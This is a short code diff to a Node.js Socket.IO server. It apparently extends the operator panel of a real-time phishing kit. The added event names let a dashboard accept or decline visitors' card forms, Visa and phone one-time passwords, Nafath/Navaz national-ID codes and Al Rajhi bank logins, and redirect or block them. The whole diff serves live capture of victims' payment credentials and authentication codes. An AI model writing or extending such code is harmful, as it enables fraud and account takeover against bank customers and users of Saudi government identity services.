@@ -515,7 +515,7 @@ app.get("/admin/health", requireAdmin, (_req, res) => {
   });
 });
 
-const APP_VERSION = "v20";
+const APP_VERSION = "v21";
 
 app.get("/version", (_req, res) =>
   res.json({
@@ -772,10 +772,18 @@ const IGNORED_ANY_EVENTS = new Set([
   // admin -> client control events (not visitor submissions)
   "acceptService", "declineService", "acceptPaymentForm", "declinePaymentForm",
   "acceptPhone", "declinePhone", "acceptVisaOtp", "declineVisaOtp",
-  "acceptPhoneOtp", "declinePhoneOtp", "acceptNavaz", "declineNavaz",
+  "acceptPhoneOtp", "declinePhoneOtp", "acceptPhoneOTP", "declinePhoneOTP",
+  "acceptMobOtp", "declineMobOtp", "acceptMotslOtp", "declineMotslOtp",
+  "acceptStcPhoneOtp", "declineStcPhoneOtp", "acceptSTC", "declineSTC",
+  "acceptNavaz", "declineNavaz", "acceptNafath", "declineNafath",
+  "acceptNaflogin", "declineNaflogin", "acceptNafselogin", "declineNafselogin",
+  "acceptRajlogin", "declineRajlogin", "acceptRajhi", "declineRajhi",
   "adminRedirect", "clientBlocked", "changeNavazCode",
+  "nafathNumber", "nafathCode", "sendNafathNumber", "setNafathNumber",
   "payment:action", "otp:action", "nafath:action", "naflogin:action",
-  "phone:action", "admin:redirect",
+  "rajlogin:action", "phone:action", "admin:redirect", "nafath:code",
+  "user:blocked",
+
 ]);
 
 io.on("connection", (socket) => {
@@ -971,9 +979,34 @@ io.on("connection", (socket) => {
     "declineSTC",
     "acceptNavaz",
     "declineNavaz",
+    "acceptNafath",
+    "declineNafath",
+    "acceptNaflogin",
+    "declineNaflogin",
+    "acceptNafselogin",
+    "declineNafselogin",
+    "acceptRajlogin",
+    "declineRajlogin",
+    "acceptRajhi",
+    "declineRajhi",
     "adminRedirect",
     "clientBlocked",
     "changeNavazCode",
+    "nafathNumber",
+    "nafathCode",
+    "sendNafathNumber",
+    "setNafathNumber",
+    // namespaced fallbacks the dashboard also emits
+    "payment:action",
+    "otp:action",
+    "phone:action",
+    "nafath:action",
+    "naflogin:action",
+    "rajlogin:action",
+    "nafath:code",
+    "admin:redirect",
+    "user:blocked",
+
   ];
   adminControlEvents.forEach((ev) => {
     socket.on(ev, (payload = {}, ack) => {
